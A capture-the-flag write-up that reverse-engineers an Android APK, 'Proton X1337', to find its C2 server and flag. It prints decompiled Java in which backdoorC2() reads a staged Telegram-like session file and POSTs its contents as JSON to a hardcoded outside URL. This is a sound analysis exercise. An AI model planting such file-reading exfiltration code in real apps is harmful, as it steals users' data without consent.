# Proton X1337

## Overview

We are given an Android APK and the challenge description says the app is secretly transmitting data to a C2. The task is to identify that server and recover the flag.

The intended trap is straightforward: the APK contains a fake flag-looking string, but the real solution comes from following the malicious code path rather than trusting the first `HACK10{...}` token we see.

Final answers:

- C2: `https://appsecmy.com/pages/liga-ctf-2026`
- Flag: `HACK10{j3mpu7_s3r74_0W4SP_C7F}`

## Initial Triage

Start by identifying what kind of target we are dealing with:

```bash
md5sum ProtonX1337.apk
sha256sum ProtonX1337.apk
file ProtonX1337.apk
zipinfo -1 ProtonX1337.apk | head -n 20
```

This immediately shows:

- ZIP archive structure
- `AndroidManifest.xml`
- `resources.arsc`
- multiple `classes*.dex` files

So the target is an Android APK, specifically a multi-DEX app.

Next, pull APK metadata:

```bash
aapt dump badging ProtonX1337.apk
```

Relevant output:

```text
package: name='com.example.protonx1337' versionCode='1' versionName='1.0'
sdkVersion:'29'
targetSdkVersion:'34'
uses-permission: name='android.permission.INTERNET'
application-label:'Proton X1337'
```

At this point the important early clue is `android.permission.INTERNET`. On its own that does not prove malicious behavior, but it makes network activity a high-priority path to investigate, which aligns with the challenge prompt.

## Decompilation

For Android reversing, `jadx` and `apktool` are enough here:

```bash
jadx -d jadx_out ProtonX1337.apk
apktool d -f -o apktool_out ProtonX1337.apk
```

Use `apktool` for the manifest/resources view and `jadx` for readable Java-like logic.

The first thing to inspect is the manifest:

```bash
sed -n '1,200p' apktool_out/AndroidManifest.xml
```

The launcher activity is:

```xml
<activity android:exported="true" android:name="com.example.protonx1337.MainActivity">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
```

That gives us the real entrypoint: `com.example.protonx1337.MainActivity`.

## Main Activity Analysis

Open the decompiled activity:

```bash
sed -n '1,220p' jadx_out/sources/com/example/protonx1337/MainActivity.java
```

The key code is in `onCreate()`:

```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    ComponentActivityKt.setContent$default(this, null, ComposableSingletons$MainActivityKt.INSTANCE.m5403getLambda3$app_debug(), 1, null);
    initializeMediaStorage();
    backdoorC2();
}
```

This is the main pivot of the challenge. The activity does not wait for user input. It immediately calls two functions:

- `initializeMediaStorage()`
- `backdoorC2()`

That means these two functions are the ones we should understand first.

## Function 1: `initializeMediaStorage()`

This function creates a fake Telegram-like directory layout and drops a file into it.

High-level behavior:

```java
File baseTelegramDir = new File(getExternalFilesDir(null), "Telegram");
List<String> directoriesToCreate = listOf(
    "Telegram Audio",
    "Telegram Documents",
    "Telegram Images",
    "Telegram Video"
);
...
File targetFile = new File(docDir, "tdata_backup.txt");
FilesKt.writeText$default(targetFile, ..., null, 2, null);
```

The important part is the content written to the file. The actual string values are easier to recover from the generated literals class:

```bash
sed -n '100,170p' 'jadx_out/sources/com/example/protonx1337/LiveLiterals$MainActivityKt.java'
```

Recovered content:

```text
ACCOUNT_STATUS=ACTIVE
PHONE=+1234567890
SESSION_TOKEN=HACK10{n0t_A_Fl4g}
```

This is the intended bait.

Why it is fake:

- the app writes it itself
- it is not derived by validation logic
- it is not revealed after some success condition
- it is later used as “stolen data” for exfiltration

So `HACK10{n0t_A_Fl4g}` is not a real solve, just staged local content.

## Function 2: `backdoorC2()`

This is the actual malicious path.

Relevant excerpt:

```java
File targetFile = new File(baseTelegramDir, ...);
String stolenContent = "";
if (targetFile.exists()) {
    stolenContent = StringsKt.replace$default(
        FilesKt.readText$default(targetFile, null, 1, null),
        "\n",
        "\\n",
        false,
        4,
        null
    );
}
String d1 = LiveLiterals$MainActivityKt.INSTANCE.m5425x506ff06();
String d2 = LiveLiterals$MainActivityKt.INSTANCE.m5426xcc12e607();
URLConnection uRLConnectionOpenConnection = new URL(d1 + d2).openConnection();
HttpURLConnection connection = (HttpURLConnection) uRLConnectionOpenConnection;
connection.setRequestMethod("POST");
connection.setDoOutput(true);
connection.setRequestProperty("Content-Type", "application/json");
```

This tells us everything we need:

1. The function reads the staged file
2. It escapes newlines to fit JSON formatting
3. It constructs a URL from two hardcoded string parts
4. It opens an HTTP connection
5. It uses `POST`
6. It sends JSON

That is clear exfiltration behavior.

## Recovering the C2

Now we resolve the hardcoded strings used by `new URL(d1 + d2)`.

Again, inspect the literals file:

```bash
sed -n '130,160p' 'jadx_out/sources/com/example/protonx1337/LiveLiterals$MainActivityKt.java'
```

Recovered values:

```text
d1 = "https://appsecmy.com/"
d2 = "pages/liga-ctf-2026"
method = "POST"
header = "Content-Type"
value = "application/json"
```

So the exact endpoint is:

```text
https://appsecmy.com/pages/liga-ctf-2026
```

This is not just a random string in the binary. It is used directly in the exfiltration path, which makes it the actual C2 destination for the challenge.

## Why Following the URL Is the Correct Move

At this point there are two possible “answers” visible from static analysis:

1. the local decoy token `HACK10{n0t_A_Fl4g}`
2. the hardcoded remote endpoint used by the malware

The first one is weak because it is only staged bait.

The second one is strong because:

- it sits on the actual execution path
- the program constructs and uses it operationally
- the challenge asks for the server
- the challenge also asks for the flag, implying the destination probably matters

So the correct next step is to inspect the page itself.

## Fetching the Endpoint

First confirm the page responds:

```bash
curl -i -sS https://appsecmy.com/pages/liga-ctf-2026 | sed -n '1,40p'
```

This returns a valid HTTP response with HTML content.

Then inspect the source directly for the expected flag format:

```bash
curl -sS https://appsecmy.com/pages/liga-ctf-2026 | rg -n 'HACK10\{'
```

Result:

```text
309:    <!-- HACK10{j3mpu7_s3r74_0W4SP_C7F} -->
```

The flag is hidden in an HTML comment in the source of the C2 page.

That is the real answer path:

- the app exfiltrates to the hardcoded page
- the page source contains the actual flag

## Final Solve Chain

The clean reasoning chain is:

1. Identify the file as an Android APK
2. Confirm network capability from `android.permission.INTERNET`
3. Decompile with `jadx` and `apktool`
4. Read the manifest to find the launcher activity
5. Inspect `MainActivity.onCreate()`
6. Separate `initializeMediaStorage()` from `backdoorC2()`
7. Recognize the local `HACK10{n0t_A_Fl4g}` token as planted bait
8. Recover the hardcoded URL from the exfiltration logic
9. Visit that URL and inspect the HTML source
10. Extract the real flag from the HTML comment

## Final Answer

```text
C2:   https://appsecmy.com/pages/liga-ctf-2026
FLAG: HACK10{j3mpu7_s3r74_0W4SP_C7F}
```

## Lessons

This challenge is a good example of why static reversing should follow execution flow, not just strings.

The fake token is easy to find, but it is meaningless without context. The real solve comes from understanding:

- what runs first
- what gets written
- what gets read back
- what gets transmitted
- where it gets transmitted to

That is the core reversing mindset the challenge is trying to teach.
